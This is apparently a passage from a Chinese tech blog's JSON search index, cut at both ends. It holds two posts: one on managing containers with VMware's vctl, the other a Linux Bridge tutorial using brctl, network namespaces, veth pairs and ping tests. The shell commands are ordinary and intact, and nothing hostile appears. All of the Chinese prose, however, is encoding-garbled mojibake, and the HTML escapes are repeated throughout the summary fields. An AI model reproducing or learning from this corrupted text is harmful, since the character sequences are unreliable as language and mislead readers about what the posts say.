Windowsï¼Ÿä¸éœ€è¦ã€‚ç°åœ¨å®¹å™¨éƒ½äº¤ç»™vctlæ¥ç®¡ç†äº†ã€‚\nåœ¨ä½¿ç”¨vctlå‘½ä»¤å‰ï¼Œå’Œå¯åŠ¨dockerä¸€æ ·ï¼Œéœ€è¦å…ˆå¯åŠ¨vctlçš„å®ˆæŠ¤è¿›ç¨‹ã€‚\nvctl system start å½“éœ€è¦å…³é—­å®ˆæŠ¤è¿›ç¨‹æ—¶æ‰§è¡Œ\nvctl system stop æ¥ä¸‹æ¥å°±æ˜¯å’Œæ™®é€šçš„dockerå‘½ä»¤ä¸€æ ·äº†ã€‚\n# æ‹‰å–é•œåƒ vctl pull nginx # æŸ¥çœ‹é•œåƒ vctl images # å¯åŠ¨å®¹å™¨ vctl --name some-nginx -d -p 8080:80 nginx # æŸ¥çœ‹å®¹å™¨ vctl ps # è¿›å…¥å®¹å™¨ vctl exec -it \u0026lt;cid\u0026gt; bash æ›´å¤šä½¿ç”¨ä¿¡æ¯å¯å‚è€ƒVmwareçš„å®˜æ–¹æ–‡æ¡£ ä½¿ç”¨vctlå‘½ä»¤ç®¡ç†å®¹å™¨\n","permalink":"https://www.typesafe.cn/posts/docker-on-vmware/","summary":"\u003ch1 id=\"å‰è¨€\"\u003eå‰è¨€\u003c/h1\u003e\n\u003cp\u003eä½œä¸ºä¸€ä¸ªç§°èŒçš„æ‰“å·¥äººï¼Œç”µè„‘ä¸Šå¸¸å¤‡ä¸€ä¸ªVmwareä¸æ˜¯ä»€ä¹ˆæ–°é²œäº‹äº†ï¼Œä½†æ˜¯å®ƒå’ŒDocker for Windowsä¸å…¼å®¹å¾€å¾€å¾ˆè®©äººå¤´å¤§ã€‚é€šè¿‡æŸ¥æ‰¾èµ„æ–™ï¼Œå‘ç°æä¾›çš„è§£å†³æ–¹æ¡ˆå¤§è‡´æœ‰ä¸‰ç§\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eå…ˆä½¿ç”¨Vmwareåˆ›å»ºä¸€å°Linuxè™šæ‹Ÿæœºï¼Œåœ¨è¿™å°Linuxè™šæ‹Ÿæœºä¸Šå†å®‰è£…dockerã€‚\u003c/li\u003e\n\u003cli\u003eé…ç½®Vmwareä½œä¸ºDocker for Windowsçš„è¿è¡Œå¹³å°ã€‚\u003c/li\u003e\n\u003cli\u003eä½¿ç”¨å¾®è½¯çš„Hyper-væ¥åˆ›å»ºè™šæ‹Ÿæœºã€‚\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eå¯¹æˆ‘è€Œè¨€ï¼Œç¬¬ä¸€ç§ä¸å¤ªä¼˜é›…ï¼Œç¬¬äºŒç§é…ç½®ç¹çï¼Œç¬¬ä¸‰ç§ä¸ä¼šç”¨ã€‚\u003c/p\u003e\n\u003cp\u003eç›´åˆ°æˆ‘å‘ç°äº†vctlè¿™ä¸ªå¥½ä¸œè¥¿ã€‚\u003c/p\u003e\n\u003ch1 id=\"vctl-æ˜¯ä»€ä¹ˆ\"\u003evctl æ˜¯ä»€ä¹ˆï¼Ÿ\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003evctl æ˜¯ä¸€æ¬¾æ†ç»‘åœ¨Vmware Workstation Pro åº”ç”¨ç¨‹åºä¸­çš„å‘½ä»¤è¡Œå®ç”¨ç¨‹åºï¼Œä»…åœ¨ Windows 10 1809 æˆ–æ›´é«˜ç‰ˆæœ¬ä¸Šå—æ”¯æŒã€‚å¦‚æœ Workstation Pro æ‰€åœ¨ä¸»æœºä¸Šçš„ Windows æ“ä½œç³»ç»Ÿä½äº Windows 10 1809ï¼Œåˆ™å®ƒä¸æ”¯æŒ vctl CLIã€‚\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eç®€å•æ¥è¯´å®ƒå°±æ˜¯Vmwareä¸Šçš„ä¸€ä¸ªå·¥å…·ï¼Œå¯ä»¥ç”¨å®ƒæ¥ç®¡ç†å®¹å™¨ï¼Œä½¿ç”¨å‘½ä»¤åŸºæœ¬ä¸Šå’Œdockerä¸€è‡´ï¼Œåªéœ€è¦æŠŠ\u003ccode\u003edocker \u0026lt;cmd\u0026gt;\u003c/code\u003eæ¢æˆ\u003ccode\u003evctl \u0026lt;cmd\u0026gt;\u003c/code\u003eå°±è¶³å¤Ÿäº†ã€‚Docker for Windowsï¼Ÿä¸éœ€è¦ã€‚ç°åœ¨å®¹å™¨éƒ½äº¤ç»™vctlæ¥ç®¡ç†äº†ã€‚\u003c/p\u003e\n\u003cp\u003eåœ¨ä½¿ç”¨vctlå‘½ä»¤å‰ï¼Œå’Œå¯åŠ¨dockerä¸€æ ·ï¼Œéœ€è¦å…ˆå¯åŠ¨vctlçš„å®ˆæŠ¤è¿›ç¨‹ã€‚\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003evctl system start\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eå½“éœ€è¦å…³é—­å®ˆæŠ¤è¿›ç¨‹æ—¶æ‰§è¡Œ\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003evctl system stop\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eæ¥ä¸‹æ¥å°±æ˜¯å’Œæ™®é€šçš„dockerå‘½ä»¤ä¸€æ ·äº†ã€‚\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# æ‹‰å–é•œåƒ\nvctl pull nginx\n\n# æŸ¥çœ‹é•œåƒ\nvctl images\n\n# å¯åŠ¨å®¹å™¨\nvctl --name some-nginx -d -p 8080:80 nginx\n\n# æŸ¥çœ‹å®¹å™¨\nvctl ps\n\n# è¿›å…¥å®¹å™¨\nvctl exec -it \u0026lt;cid\u0026gt; bash \n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eæ›´å¤šä½¿ç”¨ä¿¡æ¯å¯å‚è€ƒVmwareçš„å®˜æ–¹æ–‡æ¡£ \u003ca href=\"https://docs.vmware.com/cn/VMware-Fusion/11/com.vmware.fusion.using.doc/GUID-78E7339F-7294-4F3E-9AD0-1E14C201FA40.html\"\u003eä½¿ç”¨vctlå‘½ä»¤ç®¡ç†å®¹å™¨\u003c/a\u003e\u003c/p\u003e","title":"Dockerï¼ŸVmwareï¼Ÿå°å­©å­æ‰åšé€‰æ‹©ï¼Œæ‰“å·¥äººæˆ‘å…¨éƒ½è¦ã€‚"},{"content":"Linux Bridge è¯¦è§£ Linux Bridgeï¼ˆç½‘æ¡¥ï¼‰æ˜¯ç”¨çº¯è½¯ä»¶å®ç°çš„è™šæ‹Ÿäº¤æ¢æœºï¼Œæœ‰ç€å’Œç‰©ç†äº¤æ¢æœºç›¸åŒçš„åŠŸèƒ½ï¼Œä¾‹å¦‚äºŒå±‚äº¤æ¢ï¼ŒMACåœ°å€å­¦ä¹ ç­‰ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æŠŠtun/tapï¼Œveth pairç­‰è®¾å¤‡ç»‘å®šåˆ°ç½‘æ¡¥ä¸Šï¼Œå°±åƒæ˜¯æŠŠè®¾å¤‡è¿æ¥åˆ°ç‰©ç†äº¤æ¢æœºä¸Šä¸€æ ·ã€‚æ­¤å¤–å®ƒå’Œveth pairã€tun/tapä¸€æ ·ï¼Œä¹Ÿæ˜¯ä¸€ç§è™šæ‹Ÿç½‘ç»œè®¾å¤‡ï¼Œå…·æœ‰è™šæ‹Ÿè®¾å¤‡çš„æ‰€æœ‰ç‰¹æ€§ï¼Œä¾‹å¦‚é…ç½®IPï¼ŒMACåœ°å€ç­‰ã€‚\nLinux Bridgeé€šå¸¸æ˜¯æ­é…KVMã€dockerç­‰è™šæ‹ŸåŒ–æŠ€æœ¯ä¸€èµ·ä½¿ç”¨çš„ï¼Œç”¨äºæ„å»ºè™šæ‹Ÿç½‘ç»œï¼Œå› ä¸ºæ­¤æ•™ç¨‹ä¸æ¶‰åŠè™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œæˆ‘ä»¬å°±ä½¿ç”¨å‰é¢å­¦ä¹ è¿‡çš„netnsæ¥æ¨¡æ‹Ÿè™šæ‹Ÿè®¾å¤‡ã€‚\nå¦‚ä½•ä½¿ç”¨Linux Bridgeï¼Ÿ æ“ä½œç½‘æ¡¥æœ‰å¤šç§æ–¹å¼ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ä»‹ç»ä¸€ä¸‹é€šè¿‡bridge-utilsæ¥æ“ä½œï¼Œç”±äºå®ƒä¸æ˜¯Linuxç³»ç»Ÿè‡ªå¸¦çš„å·¥å…·ï¼Œå› æ­¤éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æ¥å®‰è£…å®ƒã€‚\n# centos yum install -y bridge-utils # ubuntu apt-get install -y bridge-utils ä½¿ç”¨brctl helpæŸ¥çœ‹ä½¿ç”¨å¸®åŠ©\nnever heard of command [help] Usage: brctl [commands] commands: addbr \u0026lt;bridge\u0026gt;\tadd bridge delbr \u0026lt;bridge\u0026gt;\tdelete bridge addif \u0026lt;bridge\u0026gt; \u0026lt;device\u0026gt;\tadd interface to bridge delif \u0026lt;bridge\u0026gt; \u0026lt;device\u0026gt;\tdelete interface from bridge hairpin \u0026lt;bridge\u0026gt; \u0026lt;port\u0026gt; {on|off}\tturn hairpin on/off setageing \u0026lt;bridge\u0026gt; \u0026lt;time\u0026gt;\tset ageing time setbridgeprio\t\u0026lt;bridge\u0026gt; \u0026lt;prio\u0026gt;\tset bridge priority setfd \u0026lt;bridge\u0026gt; \u0026lt;time\u0026gt;\tset bridge forward delay sethello \u0026lt;bridge\u0026gt; \u0026lt;time\u0026gt;\tset hello time setmaxage \u0026lt;bridge\u0026gt; \u0026lt;time\u0026gt;\tset max message age setpathcost\t\u0026lt;bridge\u0026gt; \u0026lt;port\u0026gt; \u0026lt;cost\u0026gt;\tset path cost setportprio\t\u0026lt;bridge\u0026gt; \u0026lt;port\u0026gt; \u0026lt;prio\u0026gt;\tset port priority show [ \u0026lt;bridge\u0026gt; ]\tshow a list of bridges showmacs \u0026lt;bridge\u0026gt;\tshow a list of mac addrs showstp \u0026lt;bridge\u0026gt;\tshow bridge stp info stp \u0026lt;bridge\u0026gt; {on|off}\tturn stp on/off å¸¸ç”¨å‘½ä»¤å¦‚\næ–°å»ºä¸€ä¸ªç½‘æ¡¥ï¼š\nbrctl addbr \u0026lt;bridge\u0026gt; æ·»åŠ ä¸€ä¸ªè®¾å¤‡ï¼ˆä¾‹å¦‚eth0ï¼‰åˆ°ç½‘æ¡¥ï¼š\nbrctl addif \u0026lt;bridge\u0026gt; eth0 æ˜¾ç¤ºå½“å‰å­˜åœ¨çš„ç½‘æ¡¥åŠå…¶æ‰€è¿æ¥çš„ç½‘ç»œç«¯å£ï¼š\nbrctl show å¯åŠ¨ç½‘æ¡¥ï¼š\nip link set \u0026lt;bridge\u0026gt; up åˆ é™¤ç½‘æ¡¥ï¼Œéœ€è¦å…ˆå…³é—­å®ƒï¼š\nip link set \u0026lt;bridge\u0026gt; down brctl delbr \u0026lt;bridge\u0026gt; æˆ–è€…ä½¿ç”¨ip link del å‘½ä»¤ç›´æ¥åˆ é™¤ç½‘æ¡¥\nip link del \u0026lt;bridge\u0026gt; å¢åŠ Linux Bridgeæ—¶ä¼šè‡ªåŠ¨å¢åŠ ä¸€ä¸ªåŒåè™šæ‹Ÿç½‘å¡åœ¨å®¿ä¸»æœºå™¨ä¸Šï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ip linkå‘½ä»¤æ“ä½œè¿™ä¸ªè™šæ‹Ÿç½‘å¡ï¼Œå®é™…ä¸Šä¹Ÿå°±æ˜¯æ“ä½œç½‘æ¡¥ï¼Œå¹¶ä¸”åªæœ‰å½“è¿™ä¸ªè™šæ‹Ÿç½‘å¡çŠ¶æ€å¤„äºupçš„æ—¶å€™ï¼Œç½‘æ¡¥æ‰ä¼šè½¬å‘æ•°æ®ã€‚\nå®éªŒ åœ¨ä¸Šä¸€èŠ‚ã€ŠLinux veth pairè¯¦è§£ã€‹æˆ‘ä»¬ä½¿ç”¨veth pairå°†ä¸¤ä¸ªéš”ç¦»çš„netnsè¿æ¥åœ¨äº†ä¸€èµ·ï¼Œåœ¨ç°å®ä¸–ç•Œé‡Œç­‰åŒäºç”¨ä¸€æ ¹ç½‘çº¿æŠŠä¸¤å°ç”µè„‘è¿æ¥åœ¨äº†ä¸€èµ·ï¼Œä½†æ˜¯åœ¨ç°å®ä¸–ç•Œé‡Œå¾€å¾€å¾ˆå°‘ä¼šæœ‰äººè¿™æ ·ä½¿ç”¨ã€‚å› ä¸ºä¸€å°è®¾å¤‡ä¸ä»…ä»…åªéœ€è¦å’Œå¦ä¸€å°è®¾å¤‡é€šä¿¡ï¼Œå®ƒéœ€è¦å’Œå¾ˆå¤šå¾ˆå¤šçš„ç½‘ç»œè®¾å¤‡è¿›è¡Œé€šä¿¡ï¼Œå¦‚æœè¿˜ä½¿ç”¨è¿™æ ·çš„æ–¹å¼ï¼Œéœ€è¦ååˆ†å¤æ‚çš„ç½‘ç»œæ¥çº¿ï¼Œå¹¶ä¸”ç°å®ä¸–ç•Œä¸­çš„æ™®é€šç½‘ç»œè®¾å¤‡ä¹Ÿæ²¡æœ‰é‚£ä¹ˆå¤šç½‘ç»œæ¥å£ã€‚\né‚£ä¹ˆï¼Œæƒ³è¦è®©æŸä¸€å°è®¾å¤‡å’Œå¾ˆå¤šç½‘ç»œè®¾å¤‡éƒ½å¯ä»¥é€šä¿¡éœ€è¦å¦‚ä½•å»åšå‘¢ï¼Ÿåœ¨æˆ‘ä»¬çš„æ—¥å¸¸ç”Ÿæ´»ä¸­ï¼Œé™¤äº†æ‰‹æœºå’Œç”µè„‘ï¼Œæœ€å¸¸è§çš„ç½‘ç»œè®¾å¤‡å°±æ˜¯è·¯ç”±å™¨äº†ï¼Œæˆ‘ä»¬çš„æ‰‹æœºè¿ä¸ŠWI-FIï¼Œç”µè„‘æ’åˆ°è·¯ç”±å™¨ä¸Šï¼Œç­‰å¾…ä»è·¯ç”±å™¨çš„DHCPæœåŠ¡å™¨ä¸Šè·å–åˆ°IPï¼Œä»–ä»¬å°±å¯ä»¥ç›¸äº’é€šä¿¡äº†ï¼Œè¿™ä¾¿æ˜¯è·¯ç”±å™¨çš„äºŒå±‚äº¤æ¢åŠŸèƒ½åœ¨å·¥ä½œã€‚Linux Bridgeæœ€ä¸»è¦çš„åŠŸèƒ½å°±æ˜¯äºŒå±‚äº¤æ¢ï¼Œæ˜¯å¯¹ç°å®ä¸–ç•ŒäºŒå±‚äº¤æ¢æœºçš„æ¨¡æ‹Ÿï¼Œæˆ‘ä»¬ç¨å¾®æ”¹åŠ¨ä¸€ä¸‹ç½‘ç»œæ‹“æ‰‘ï¼Œå¦‚ä¸‹å›¾ï¼š\næˆ‘ä»¬å»ºç«‹äº†ä¸€ä¸ªç½‘æ¡¥ï¼Œä¸‰ä¸ªnetnsï¼Œä¸‰å¯¹veth pairï¼Œåˆ†åˆ«ä¸€ç«¯åœ¨netnsä¸­ï¼Œå¦ä¸€ç«¯è¿æ¥åœ¨ç½‘æ¡¥ä¸Šï¼Œä¸ºäº†ç®€åŒ–æ‹“æ‰‘ï¼Œæˆ‘å»é™¤äº†netnsä¸­çš„tapè®¾å¤‡ï¼Œå°†IPç›´æ¥é…ç½®åœ¨vethä¸Šã€‚\nvethè®¾å¤‡ä¸ä»…ä»…å¯ä»¥å¯ä»¥å……å½“â€œç½‘çº¿â€ï¼ŒåŒæ—¶å®ƒä¹Ÿå¯ä»¥å½“ä½œè™šæ‹Ÿç½‘å¡æ¥ä½¿ç”¨ã€‚\n# æ·»åŠ ç½‘æ¡¥ brctl addbr br0 # å¯åŠ¨ç½‘æ¡¥ ip link set br0 up # æ–°å¢ä¸‰ä¸ªnetns ip netns add ns0 ip netns add ns1 ip netns add ns2 # æ–°å¢ä¸¤å¯¹veth ip link add veth0-ns type veth peer name veth0-br ip link add veth1-ns type veth peer name veth1-br ip link add veth2-ns type veth peer name veth2-br # å°†vethçš„ä¸€ç«¯ç§»åŠ¨åˆ°netnsä¸­ ip link set veth0-ns netns ns0 ip link set veth1-ns netns ns1 ip link set veth2-ns netns ns2 # å°†netnsä¸­çš„æœ¬åœ°ç¯å›å’Œvethå¯åŠ¨å¹¶é…ç½®IP ip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set veth0-ns up ip netns exec ns0 ip addr add 10.0.0.1/24 dev veth0-ns ip netns exec ns1 ip link set lo up ip netns exec ns1 ip link set veth1-ns up ip netns exec ns1 ip addr add 10.0.0.2/24 dev veth1-ns ip netns exec ns2 ip link set lo up ip netns exec ns2 ip link set veth2-ns up ip netns exec ns2 ip addr add 10.0.0.3/24 dev veth2-ns # å°†vethçš„å¦ä¸€ç«¯å¯åŠ¨å¹¶æŒ‚è½½åˆ°ç½‘æ¡¥ä¸Š ip link set veth0-br up ip link set veth1-br up ip link set veth2-br up brctl addif br0 veth0-br brctl addif br0 veth1-br brctl addif br0 veth2-br æµ‹è¯•ç½‘ç»œè¿é€šæ€§\nä½¿ç”¨ip netns exec ns0 ping 10.0.0.2åœ¨å‘½åç©ºé—´ns0ä¸­æµ‹è¯•ä¸ns1çš„10.0.0.2çš„ç½‘ç»œè¿é€šæ€§\nPING 10.0.0.2 (10.0.0.2) 56(84) bytes of data. 64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=0.032 ms 64 bytes from 10.0.0.2: icmp_seq=2 ttl=64 time=0.058 ms 64 bytes from 10.0.0.2: icmp_seq=3 ttl=64 time=0.052 ms 64 bytes from 10.0.0.2: icmp_seq=4 ttl=64 time=0.044 ms ^C --- 10.0.0.2 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 54ms rtt min/avg/max/mdev = 0.032/0.046/0.058/0.011 ms ä½¿ç”¨ip netns exec ns0 ping 10.0.0.3åœ¨å‘½åç©ºé—´ns0ä¸­æµ‹è¯•ä¸ns2çš„10.0.0.3çš„ç½‘ç»œè¿é€šæ€§\nPING 10.0.0.3 (10.0.0.3) 56(84) bytes of data. 64 bytes from 10.0.0.3: icmp_seq=1 ttl=64 time=0.054 ms 64 bytes from 10.0.0.3: icmp_seq=2 ttl=64 time=0.045 ms 64 bytes from 10.0.0.3: icmp_seq=3 ttl=64 time=0.058 ms 64 bytes from 10.0.0.3: icmp_seq=4 ttl=64 time=0.064 ms ^C --- 10.0.0.3 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 81ms rtt min/avg/max/mdev = 0.045/0.055/0.064/0.008 ms ä½¿ç”¨ip netns exec ns1 ping 10.0.0.1åœ¨å‘½åç©ºé—´ns1ä¸­æµ‹è¯•ä¸ns0çš„10.0.0.1çš„ç½‘ç»œè¿é€šæ€§\nPING 10.0.0.1 (10.0.0.1) 56(84) bytes of data. 64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms 64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.046 ms 64 bytes from 10.0.0.1: icmp_seq=3 ttl=64 time=0.038 ms 64 bytes from 10.0.0.1: icmp_seq=4 ttl=64 time=0.041 ms ^C --- 10.0.0.1 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 81ms rtt min/avg/max/mdev = 0.031/0.039/0.046/0.005 ms ä½¿ç”¨ip netns exec ns1 ping 10.0.0.3åœ¨å‘½åç©ºé—´ns1ä¸­æµ‹è¯•ä¸ns2çš„10.0.0.3çš„ç½‘ç»œè¿é€šæ€§\nPING 10.0.0.3 (10.0.0.3) 56(84) bytes of data. 64 bytes from 10.0.0.3: icmp_seq=1 ttl=64 time=0.060 ms 64 bytes from 10.0.0.3: icmp_seq=2 ttl=64 time=0.059 ms 64 bytes from 10.0.0.3: icmp_seq=3 ttl=64 time=0.044 ms 64 bytes from 10.0.0.3: icmp_seq=4 ttl=64 time=0.065 ms ^C --- 10.0.0.3 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 65ms rtt min/avg/max/mdev = 0.044/0.057/0.065/0.007 ms ä½¿ç”¨ip netns exec ns2 ping 10.0.0.1åœ¨å‘½åç©ºé—´ns2ä¸­æµ‹è¯•ä¸ns0çš„10.0.0.1çš„ç½‘ç»œè¿é€šæ€§\nPING 10.0.0.1 (10.0.0.1) 56(84) bytes of data. 64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms 64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.056 ms 64 bytes from 10.0.0.1: icmp_seq=3 ttl=64 time=0.043 ms 64 bytes from 10.0.0.1: icmp_seq=4 ttl=64 time=0.060 ms ^C --- 10.0.0.1 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 69ms rtt min/avg/max/mdev = 0.032/0.047/0.060/0.013 ms ä½¿ç”¨ip netns exec ns2 ping 10.0.0.2åœ¨å‘½åç©ºé—´ns2ä¸­æµ‹è¯•ä¸ns1çš„10.0.0.2çš„ç½‘ç»œè¿é€šæ€§\nPING 10.0.0.2 (10.0.0.2) 56(84) bytes of data. 64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=0.030 ms 64 bytes from 10.0.0.2: icmp_seq=2 ttl=64 time=0.055 ms 64 bytes from 10.0.0.2: icmp_seq=3 ttl=64 time=0.044 ms 64 bytes from 10.0.0.2: icmp_seq=4 ttl=64 time=0.042 ms ^C --- 10.0.0.2 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 114ms rtt min/avg/max/mdev = 0.030/0.042/0.055/0.011 ms å¯ä»¥çœ‹åˆ°æˆ‘ä»¬é€šè¿‡ç½‘æ¡¥çš„æ–¹å¼æŠŠä¸‰ä¸ªéš”ç¦»çš„netnsè¿æ¥åœ¨äº†ä¸€èµ·ï¼Œé€šè¿‡è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å¾ˆæ–¹ä¾¿çš„æ·»åŠ ç¬¬å››ä¸ªnetnsï¼Œç¬¬äº”ä¸ªnetns\u0026hellip;åœ¨è¿™é‡Œæˆ‘ä»¬å°±ä¸å±•å¼€äº†ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥å°è¯•ä¸€ä¸‹ã€‚\næ¥ä¸‹æ¥æˆ‘ä»¬æ¥è®²è§£ä¸€ä¸‹dockerçš„å‡ ç§ç½‘ç»œæ¨¡å¼ã€‚\n","permalink":"https://www.typesafe.cn/posts/linux-bridge/","summary":"\u003ch1 id=\"linux-bridge-è¯¦è§£\"\u003eLinux Bridge è¯¦è§£\u003c/h1\u003e\n\u003cp\u003eLinux Bridgeï¼ˆç½‘æ¡¥ï¼‰æ˜¯ç”¨çº¯è½¯ä»¶å®ç°çš„è™šæ‹Ÿäº¤æ¢æœºï¼Œæœ‰ç€å’Œç‰©ç†äº¤æ¢æœºç›¸åŒçš„åŠŸèƒ½ï¼Œä¾‹å¦‚äºŒå±‚äº¤æ¢ï¼ŒMACåœ°å€å­¦ä¹ ç­‰ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æŠŠtun/tapï¼Œveth pairç­‰è®¾å¤‡ç»‘å®šåˆ°ç½‘æ¡¥ä¸Šï¼Œå°±åƒæ˜¯æŠŠè®¾å¤‡è¿æ¥åˆ°ç‰©ç†äº¤æ¢æœºä¸Šä¸€æ ·ã€‚æ­¤å¤–å®ƒå’Œveth pairã€tun/tapä¸€æ ·ï¼Œä¹Ÿæ˜¯ä¸€ç§è™šæ‹Ÿç½‘ç»œè®¾å¤‡ï¼Œå…·æœ‰è™šæ‹Ÿè®¾å¤‡çš„æ‰€æœ‰ç‰¹æ€§ï¼Œä¾‹å¦‚é…ç½®IPï¼ŒMACåœ°å€ç­‰ã€‚\u003c/p\u003e\n\u003cp\u003eLinux Bridgeé€šå¸¸æ˜¯æ­é…KVMã€dockerç­‰è™šæ‹ŸåŒ–æŠ€æœ¯ä¸€èµ·ä½¿ç”¨çš„ï¼Œç”¨äºæ„å»ºè™šæ‹Ÿç½‘ç»œï¼Œå› ä¸ºæ­¤æ•™ç¨‹ä¸æ¶‰åŠè™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œæˆ‘ä»¬å°±ä½¿ç”¨å‰é¢å­¦ä¹ è¿‡çš„netnsæ¥æ¨¡æ‹Ÿè™šæ‹Ÿè®¾å¤‡ã€‚\u003c/p\u003e\n\u003ch2 id=\"å¦‚ä½•ä½¿ç”¨linux-bridge\"\u003eå¦‚ä½•ä½¿ç”¨Linux Bridgeï¼Ÿ\u003c/h2\u003e\n\u003cp\u003eæ“ä½œç½‘æ¡¥æœ‰å¤šç§æ–¹å¼ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ä»‹ç»ä¸€ä¸‹é€šè¿‡\u003cstrong\u003ebridge-utils\u003c/strong\u003eæ¥æ“ä½œï¼Œç”±äºå®ƒä¸æ˜¯Linuxç³»ç»Ÿè‡ªå¸¦çš„å·¥å…·ï¼Œå› æ­¤éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æ¥å®‰è£…å®ƒã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# centos\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum install -y bridge-utils\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# ubuntu\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eapt-get install -y bridge-utils\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä½¿ç”¨\u003ccode\u003ebrctl help\u003c/code\u003eæŸ¥çœ‹ä½¿ç”¨å¸®åŠ©\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enever heard of command \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003ehelp\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUsage: brctl \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003ecommands\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecommands:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\taddbr     \t\u0026lt;bridge\u0026gt;\t\tadd bridge\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tdelbr     \t\u0026lt;bridge\u0026gt;\t\tdelete bridge\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\taddif     \t\u0026lt;bridge\u0026gt; \u0026lt;device\u0026gt;\tadd interface to bridge\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tdelif     \t\u0026lt;bridge\u0026gt; \u0026lt;device\u0026gt;\tdelete interface from bridge\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\thairpin   \t\u0026lt;bridge\u0026gt; \u0026lt;port\u0026gt; \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003eon|off\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\tturn hairpin on/off\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tsetageing \t\u0026lt;bridge\u0026gt; \u0026lt;time\u0026gt;\t\tset ageing time\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tsetbridgeprio\t\u0026lt;bridge\u0026gt; \u0026lt;prio\u0026gt;\t\tset bridge priority\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tsetfd     \t\u0026lt;bridge\u0026gt; \u0026lt;time\u0026gt;\t\tset bridge forward delay\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tsethello  \t\u0026lt;bridge\u0026gt; \u0026lt;time\u0026gt;\t\tset hello time\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tsetmaxage \t\u0026lt;bridge\u0026gt; \u0026lt;time\u0026gt;\t\tset max message age\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tsetpathcost\t\u0026lt;bridge\u0026gt; \u0026lt;port\u0026gt; \u0026lt;cost\u0026gt;\tset path cost\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tsetportprio\t\u0026lt;bridge\u0026gt; \u0026lt;port\u0026gt; \u0026lt;prio\u0026gt;\tset port priority\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tshow      